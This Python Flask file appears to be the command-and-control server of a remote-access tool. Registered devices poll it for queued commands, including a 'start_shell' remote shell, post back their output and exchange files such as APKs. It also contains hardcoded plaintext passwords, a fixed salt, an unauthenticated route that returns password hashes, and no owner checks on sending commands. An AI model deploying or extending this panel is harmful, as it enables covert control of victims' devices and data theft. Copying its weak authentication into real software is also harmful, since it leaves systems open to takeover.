from flask import Flask, request, jsonify, send_from_directory
from werkzeug.utils import secure_filename
import hashlib
import os
import time

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'apk', 'zip', 'rar'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Helper functions for password hashing
def hash_password(password: str, salt: str = "cyber_salt") -> str:
    return hashlib.sha256((salt + password).encode()).hexdigest()

def check_password(stored_hash: str, attempt: str, salt: str = "cyber_salt") -> bool:
    return stored_hash == hash_password(attempt, salt)

# Stored hashed passwords
passwords = {
    "user": hash_password("user123"),
    "admin": hash_password("Cyb37h4ck37")
}

# In-memory storage
devices = {}
commands = {}
results = {}
shell_sessions = {}
last_seen = {}

# Utility functions
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def is_online(device_id):
    return time.time() - last_seen.get(device_id, 0) < 60

# Routes

@app.route('/register_device', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    device_name = data.get('device_name')
    owner_token = data.get('owner_token')
    if not all([device_id, device_name, owner_token]):
        return jsonify({'status': 'error', 'message': 'Missing fields'}), 400
    devices[device_id] = {
        'name': device_name,
        'owner_token': owner_token
    }
    last_seen[device_id] = time.time()
    return jsonify({'status': 'success'})

@app.route('/get_devices', methods=['GET'])
def get_devices():
    owner_token = request.args.get('owner_token')
    if not owner_token:
        return jsonify({'status': 'error', 'message': 'Missing owner_token'}), 400
    user_devices = []
    for device_id, info in devices.items():
        if info['owner_token'] == owner_token:
            user_devices.append({
                'device_id': device_id,
                'name': info['name'],
                'online': is_online(device_id)
            })
    return jsonify({'devices': user_devices})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    device_id = data.get('device_id')
    if device_id in devices:
        last_seen[device_id] = time.time()
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error', 'message': 'Device not registered'}), 400

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    if not all([device_id, command]):
        return jsonify({'status': 'error', 'message': 'Missing fields'}), 400
    if device_id not in devices:
        return jsonify({'status': 'error', 'message': 'Device not registered'}), 400
    if command == 'start_shell':
        shell_sessions[device_id] = True
        commands.setdefault(device_id, []).append('start_shell')
    elif command == 'exit':
        shell_sessions.pop(device_id, None)
        commands.setdefault(device_id, []).append('exit')
    else:
        if device_id in shell_sessions:
            commands.setdefault(device_id, []).append(command)
        else:
            commands.setdefault(device_id, []).append(command)
    return jsonify({'status': 'success'})

@app.route('/get_commands', methods=['GET'])
def get_commands():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
    cmds = commands.get(device_id, [])
    commands[device_id] = []
    return jsonify({'commands': cmds})

@app.route('/post_result', methods=['POST'])
def post_result():
    data = request.json
    device_id = data.get('device_id')
    output = data.get('output')
    if not all([device_id, output]):
        return jsonify({'status': 'error', 'message': 'Missing fields'}), 400
    results.setdefault(device_id, []).append(output)
    return jsonify({'status': 'success'})

@app.route('/get_results', methods=['GET'])
def get_results():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400
    res = results.get(device_id, [])
    results[device_id] = []
    return jsonify({'results': res})

@app.route('/upload_file', methods=['POST'])
def upload_file():
    device_id = request.form.get('device_id')
    if 'file' not in request.files or not device_id:
        return jsonify({'status': 'error', 'message': 'Missing file or device_id'}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        return jsonify({'status': 'success', 'filename': filename})
    return jsonify({'status': 'error', 'message': 'File type not allowed'}), 400

@app.route('/download_file/<filename>', methods=['GET'])
def download_file(filename):
    if not allowed_file(filename):
        return jsonify({'status': 'error', 'message': 'File type not allowed'}), 400
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)

@app.route('/get_passwords', methods=['GET'])
def get_passwords():
    # For internal use; do not expose in production
    return jsonify({
        "user": passwords["user"],
        "admin": passwords["admin"]
    })

@app.route('/set_passwords', methods=['POST'])
def set_passwords():
    data = request.json
    admin_pass = data.get('admin_pass')
    new_user = data.get('user')
    new_admin = data.get('admin')
    if not admin_pass:
        return jsonify({'status': 'error', 'message': 'Missing admin_pass'}), 400
    if not check_password(passwords["admin"], admin_pass):
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403
    if new_user:
        passwords["user"] = hash_password(new_user)
    if new_admin:
        passwords["admin"] = hash_password(new_admin)
    return jsonify({'status': 'success', 'message': 'Passwords updated'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
